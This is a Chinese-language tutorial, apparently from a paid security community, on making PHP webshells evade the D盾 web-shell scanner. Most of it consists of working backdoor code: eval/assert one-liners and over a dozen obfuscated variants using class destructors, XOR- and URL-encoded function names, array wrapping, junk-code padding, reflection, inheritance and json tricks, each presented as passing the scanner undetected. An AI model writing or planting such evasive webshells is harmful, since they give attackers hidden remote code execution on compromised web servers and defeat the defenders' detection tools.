# [知识星球]WebShell免杀之PHP


<meta name="referrer" content="no-referrer" />

## 前言

php的免杀可以说是已经被说烂了。

由于php特别灵活，所产生的变种也是层出不穷

但是与此同时，D盾等waf的检测也格外严格。

有时候写的比较花，D盾虽然不认识，但他给你报一级或者二级变量函数就很难受。

写这篇文章的目的不是仅仅让大家能够bypass D盾

而是希望大家就算碰到没有见过的waf也能够掌握bypass的思路。

所以这里跟着大家一起从0开始，一步步拓展思路，免杀D盾。

## 确定免杀原型

首先确定你所要免杀的原型，在此基础上对其进行编码。

### 常见的PHP一句话原型

```
<?php @eval($_POST['yzddmr6']); ?>
<?php @assert($_POST['yzddmr6']); ?>
<?php $ant=create_function("", base64_decode('QGV2YWwoJF9QT1NUWyJhbnQiXSk7'));$ant();?>
<?php preg_replace("/test/e",$_GET["yzddmr6"],"test"); ?> 
...
```

一般一句话的组成分为两个部分：执行跟传参

`$_POST['yzddmr6']`负责接收用户输入的参数

`eval`是负责将接收到的字符串执行

免杀也就是分为这两部分来做。

要么混淆执行部分，要么混淆传参部分，要么两者都混淆。

这里要注意一下eval跟其他函数的不同：

**eval 是一个语言构造器而不是一个函数，不能被可变函数调用**

可变函数：通过一个变量，获取其对应的变量值，然后通过给该值增加一个括号()，让系统认为该值是一个函数，从而当做函数来执行

意思就是说`` 这样是不行的

所以在php7.x以下，assert要比eval灵活的多。

但是在php7.1以上，assert同样也变成了一种语言结构，也就无法具有可变函数的特性。

所以当你确定免杀原型为``的时候，就不能想着编码`eval`了，应该考虑怎么混淆传参部分。

也就是把`$_POST['yzddmr6']`神不知鬼不觉的传到eval里

如果确定原型是``就要考虑怎么把`assert`这个字符串拼接混淆。

这里有人会问了，为什么waf不直接全面封杀eval，见到eval assert就报毒呢？

因为在实际生产中确实需要eval函数，并不是所有带eval的都是后门。

如果不分青红皂白就杀会导致误报，把正常文件杀了网站就无法正常运行了。

## 打开语法手册

翻语法手册主要关注以下几点

- 字符串操作函数
- 如何自定义函数

- 如何自定义类

### 字符串操作函数

想找比较全的可以点[这里](https://www.w3school.com.cn/php/php_ref_string.asp)

下面我列举了一些常用的字符串变形函数

```
base64_encode()  字符串base64编码
base64_decode()		字符串base64解码
urlencode()   字符串url编码
urldecode()   字符串url解码
bin2hex()	把 ASCII 字符的字符串转换为十六进制值。
hex2bin()	把十六进制值的字符串转换为 ASCII 字符。
chr()	从指定的 ASCII 值返回字符。
ord()	返回字符串中第一个字符的 ASCII 值。
explode()	把字符串打散为数组。
implode()	返回由数组元素组合成的字符串。
parse_str()	把查询字符串解析到变量中。
str_ireplace()	替换字符串中的一些字符（对大小写不敏感）。
str_replace()	替换字符串中的一些字符（对大小写敏感）。
str_repeat()	把字符串重复指定的次数。
str_rot13()	对字符串执行 ROT13 编码。
str_shuffle()	随机地打乱字符串中的所有字符。
str_split()	把字符串分割到数组中。
strip_tags()	剥去字符串中的 HTML 和 PHP 标签。
stripos()	返回字符串在另一字符串中第一次出现的位置（对大小写不敏感）。
stristr()	查找字符串在另一字符串中第一次出现的位置（大小写不敏感）。
strlen()	返回字符串的长度。
strpos()	返回字符串在另一字符串中第一次出现的位置（对大小写敏感）。
strrev()	反转字符串。
strripos()	查找字符串在另一字符串中最后一次出现的位置（对大小写不敏感）。
strrpos()	查找字符串在另一字符串中最后一次出现的位置（对大小写敏感）。
strstr()	查找字符串在另一字符串中的第一次出现（对大小写敏感）。
substr()	返回字符串的一部分。
substr_replace()	把字符串的一部分替换为另一个字符串。
```

### 如何自定义函数

[https://www.runoob.com/php/php-functions.html](https:_www.runoob.com_php_php-functions)

```
<?php
function functionName()
{
    // 要执行的代码
}
?>
```

### 如何自定义类

[https://www.runoob.com/php/php-oop.html](https:_www.runoob.com_php_php-oop)

```
PHP 定义类通常语法格式如下：
<?php
class phpClass {
  var $var1;
  var $var2 = "constant string";
  
  function myfunc ($arg1, $arg2) {
     [..]
  }
  [..]
}
?>
解析如下：
类使用 class 关键字后加上类名定义。
类名后的一对大括号({})内可以定义变量和方法。
类的变量使用 var 来声明, 变量也可以初始化值。
函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。
```

## 免杀套路

一般的变形对于D盾根本不起作用，被杀的妈都不认，这也是为什么D盾在webshell查杀领域比较具有权威性。

### 常规套路

首先选择一个幸运儿函数，没错，我还选的是urldecode()(将字符串URL解码)

选择我们的免杀原型``

这里假设我以前从来不知道D盾这个玩意

首先从零开始进行一些简单的尝试

```
<?php
$a=urldecode('%61%73%73%65%72%74');  //assert
$a($_GET['yzddmr6']);
?>
```

查杀结果：

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430534-afb6c2b8-8ed4-4d49-880b-a39fc0bf6b19.png)

直接就一级了。。。看来D盾后来改规则了。。。

可以看到他报了变量函数，并且指明了里面的参数，那么换个变量来代替GET传参试试

```
<?php
$a=urldecode('%61%73%73%65%72%74');
$b=$_GET['yzddmr6'];
$a($b);
?>
```

D盾照样报了相同的警告，那么再把参数混淆一下？

```
<?php
$a=urldecode('%61%73%73%65%72%74');
$b=urldecode("%5f%47%45%54");
$c=${$b}['mr6'];
$a($c);
?>
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430627-b24da8f4-92d0-47d3-a06d-1b0a095df769.png)

这里就只报变量函数了，但是照样是1级。

再混淆一下？

```
<?php
function test(){
    $a=urldecode('%61%73%73%65%72%74');
    if ('a'>'b'){
        return ;
    }
    else return $a;
    
}
$b=urldecode('%24%5f%47%45%54%5b%27%79%7a%64%64%6d%72%36%27%5d');
$test=test();
$test($b);
?>
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430716-cd6e8407-7c48-40d6-869e-13183f1b2798.png)

我们发现只要满足xxx(xxxx)这种格式D盾都会报一级。

从自己这么长时间跟D盾的斗争经验来说，1级变量函数不太容易过

这里直接给大家分享一些自己总结的免杀方法。

### 类调用

自己在`webshell-venom`里面一直用的类调用的方式绕过D盾

下面是webshell-venom-3.3生成的shell

```
<?php
class KBFI{
    function __destruct(){
        $XMKD='B:YVD%'^"\x23\x49\x2a\x33\x36\x51";
        return @$XMKD("$this->RUOK");
    }
}
$kbfi=new KBFI();
@$kbfi->RUOK=isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
?>
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430807-ec34a43b-2046-47e7-8b67-fb79c0e513c8.png)

惊了，这么长时间D盾还不杀。。。

因为实际操作中发现D盾对类变量不是很敏感，把混淆的内容都放到类里，就可以比较轻易地绕过D盾。

那么我们如何对上一部分的shell修改让他消除1级呢

```
<?php
class KBFI{
    function __destruct(){
        $XMKD=urldecode('%61%73%73%65%72%74');
        return @$XMKD("$this->RUOK");
    }
}
$kbfi=new KBFI();
@$kbfi->RUOK=isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
?>
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430936-da99ae78-5d27-4ba4-ab09-28b6a55a82e5.png)

会发现我们就算改了$XMKD变量后D盾也无法识别。

也就是说只要按照这个模板写出来的shell，任意修改payload都可以免杀。

这也就是为什么3.3版本可以支持任意文件免杀

不过要注意的是assert只能执行一句，必须配合eval才可以执行多句。

具体看3.3的更新日志，不再赘述。

https://yzddmr6.tk/posts/webshell-venom-3-3/

我们已经知道了通过类的方式可以很容易的免杀D盾

所以换个写法，把传参部分写到类里也可以绕过。

```
<?php 
class T{
	public $t;
	function test(){
	$this->t=@$_REQUEST['mr6'];
	$k = urldecode('%61%73%73%65%72%74');
	return $k;
	}
}
$test=new T();
$a=$test->test();
@$a($test->t);
?>
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431058-6815cafb-c3d0-4436-985b-f3a6d666eead.png)

### 数组包裹

这是星球嘉宾九世写的一个shell，我在星球里也发过他的解析。

```
<?php
function demo($name,$value){
    [$name ($value)];
}
$v=$_GET['a'];
$file=file_get_contents(__FILE__);
preg_match("/assert/",$file,$mc);
preg_match("/GET/",$file,$cs);
$cx='_'.$cs[0];
demo($mc[0],${$cx}['a'])
?>
```

原型就是`assert($_GET['a']);`

demo函数是主要的执行函数

这里的$name就是要传入的assert

valueæ¯`_GET['a']`

其他的代码都是用来混淆这两个参数的

首先$file获取自身文件的内容

```
preg_match("/assert/",$file,$mc);//把匹配到的assert字符串放到$mc数组里,其中第0号元素就是字符串“assert”
preg_match("/GET/",$file,$cs); //同理,放到了$cs[0]中
$cx='_'.$cs[0];//拼接成_GET
```

然后调用demo函数传入参数执行。

发现D盾对于外部`$a($b)`这种格式比较敏感，但是对于`[$a($b)]`这种就不能识别了。

所以我们只需要将`$a($b)`包裹进数组里即可绕过

所以按照这个套路我们可以怎么改呢

```
<?php
function demo($name,$value){
    [$name($value)];
}
demo(urldecode('%61%73%73%65%72%74'),$_POST['mr6']);
?>
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431269-62a78b32-4d45-449b-979a-bb7def31be70.png)

### 垃圾代码填充

举个例子

```
<?php
$a=urldecode('%61%73%73%65%72%74');
$b=urldecode("%5f%47%45%54");
$c=${$b}['mr6'];
$a($c);
?>
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431386-3e9ac496-cb40-4f44-bd42-b7ef6d8d32e1.png)

填充垃圾代码

```
<?php
$index = 'index.html';
$index = 'index.html';
$index = 'index.html';
$index = 'index.html';
$index = 'index.html';
$index = 'index.html';
$index = 'index.html';
$index = 'index.html';
$index = 'index.html';
$index = 'index.html';
$index = 'index.html';
$a=urldecode('%61%73%73%65%72%74');
$b=urldecode("%5f%47%45%54");
$c=${$b}['mr6'];
$a($c);
?>
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431506-d8759c29-7017-4ef7-9a16-792b15311e08.png)

玄学

### POP链

这是以后webshell-venom的方向。

之前以上所做的一切混淆编码都是人为的留后门，为了留后门而留后门，很容易被发现。

然而POP相当于程序的漏洞，可以看作是人造漏洞，难以被检测出。

可以写一个脚本来循环生成，自动拼接，自动生成payload。

项目还在规划中，有兴趣的同学可以一起研究一下。

### 补充实例

放一些星球里的例子吧，都是免杀的图就不重复贴了。

```
<?php 
class T{
    public $t;
    function test(){
    $this->t=@$_REQUEST['mr6'];
    $k = urldecode("%73%73%65%72%74");
    $a = 'a'.$k;
    return $a;
    }
}
$test=new T();
$a=$test->test();
@$a($test->t);
?>
```

**转义号绕过**

```
<?php
function Test(){
    $c=[$x='a',$x.='s',$x.='s',$x.='e',$x.='r',$x.='t'];
    $c=$_REQUEST['a'];
    return [$x("\\$c")];
}
Test();
?>
```

**类继承绕过**

```
<?php
class get{
    public function setName($name){
        return $this -> name = $name;
    }
}
class getshell extends get{
    public $name = "ass";
    public $name2 = "ert";
}
$shell = new getshell();
$gshell = $shell -> name;
$gshell2 = $shell -> name2;
$b = $shell -> setName("$_POST[1]");
$s = $gshell.$gshell2;
$s($b);
?>
```

**类反射绕过**

```
<?php
    class aassert{
        public $s;  
    }
    $a=new ReflectionClass('aassert');
    @$a->s=$_POST['mr6'];
    $b=substr((string)$a->getName(),1);
   @$b($a->s);
?>
```

**极简一句话**

```
<?php
$data=str_rot13("nffreg");
$n=[$data,$_GET['a']];
[""=>$n[0]($n[1])];
?>
```

**极简一句话2**

```
<?php
$_=[$_GET['a']];
[eval("//愚蠢的凡人\n".$_[0])];
?>
```

**不一样的匿名函数写法**

参考链接：[https://codeday.me/bug/20181026/327968.html](https:_codeday.me_bug_20181026_327968)

```
<?php
$upper=function (){
    if(isset($_GET['a'])) {
        $_=[$_GET['a'],$_GET['b']];
        $__=array([$_[0]])[0][0];
        $___=array([$_[1]])[0][0];
        [$__($___)];
    }
};
echo [$upper()];
?>
```

**仙法*数组过D盾*

```
搞的过程发现多维数组和数组的下标不一样可以使D盾报一级
<?php
$_=array([[["你真的很多BUG耶",$_GET['a']]]]);
eval($_[0][0][0][1]);
?>
```

**卢本伟绕过**

```
<?php
$_="17张牌你+t+能秒我+t+ 你能秒杀我，你+n+今天能十c七张牌把t卢本伟秒了，我i当+o+场就把这个电脑屏幕吃掉+c+。__";
$__="我+f+真他吗没+r+开挂__";
$___='现+a+在麻烦直播间的所+n+有人给我站起来+e+_';
$____=$_.$__.$___;
$_____=explode("+",$____);
$______=[$_____[9].$_____[13],$_____[19].$_____[15],$_____[1].$_____[19],$_____[20].$_____[11],'un'.'cti','o'.'n',$_GET['_']];
$_______=array($______[0].$______[1],$______[2].$______[3],$______[4].$______[5]);
$________=array($_______[0].$_______[1].$_______[2]);
$_________=$________[0]('$a',$______[6]);
$_________('phpifno();');
?>
```

**利用json过D盾**

```
<?php
   class Emp {
       public $a = "";
   }
   $e = new Emp();
   $e->a = $_GET;
eval(json_decode(json_encode($e), true)['a']['code']);
?>
```

## 最后

希望通过本文的阅读让大家明白，D盾0级的免杀也没有那么难做。

套路都是差不多的，自己多动手，想一想，你肯定能做的比我更好。
